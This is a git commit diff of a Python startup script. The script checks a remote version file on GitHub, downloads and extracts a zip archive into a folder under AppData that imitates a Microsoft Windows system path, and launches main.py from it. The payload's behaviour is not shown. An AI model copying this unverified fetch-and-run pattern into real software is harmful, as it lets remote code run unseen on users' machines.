ed76a0aad3cb645728249fbf366e23ee6a413cf9
noel-create <ladi.noel20@gmail.com>
2025-02-06 15:16:27 +0100

    Update startup.py

--- startup.py
+++ startup.py
@@ -25,21 +25,21 @@ with open(os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows
     r = requests.get("https://raw.githubusercontent.com/noel-create/skibidi/refs/heads/main/ver.txt")
     ver1 = r.text
     ver2 = ver.read()
-    if ver2 == ver1:
-        pass
-    else:
-        shutil.rmtree(os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'skibidi-mainmain'))
-        target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
-        r = requests.get("https://github.com/noel-create/skibidi/archive/refs/heads/mainmain.zip", allow_redirects=True)
-        file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skibidi-mainmain.zip')
-        open(file_path, 'wb').write(r.content)
-        with zipfile.ZipFile(file_path, 'r') as zip_ref:
-            zip_ref.extractall(target_path)
-        with open(os.path.join(target_path, "skibidi-mainmain", "update.txt"), "w") as upd:
-            upd.write(str(ver1))
-            upd.close()
-        os.remove(file_path)
     ver.close()
+if ver2 == ver1:
+    pass
+else:
+    shutil.rmtree(os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'skibidi-mainmain'))
+    target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
+    r = requests.get("https://github.com/noel-create/skibidi/archive/refs/heads/mainmain.zip", allow_redirects=True)
+    file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skibidi-mainmain.zip')
+    open(file_path, 'wb').write(r.content)
+    with zipfile.ZipFile(file_path, 'r') as zip_ref:
+        zip_ref.extractall(target_path)
+    with open(os.path.join(target_path, "skibidi-mainmain", "update.txt"), "w") as upd:
+        upd.write(str(ver1))
+        upd.close()
+    os.remove(file_path)
 target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
 subprocess.Popen(['python', os.path.join(target_path, "skibidi-mainmain", "main.py")])
 
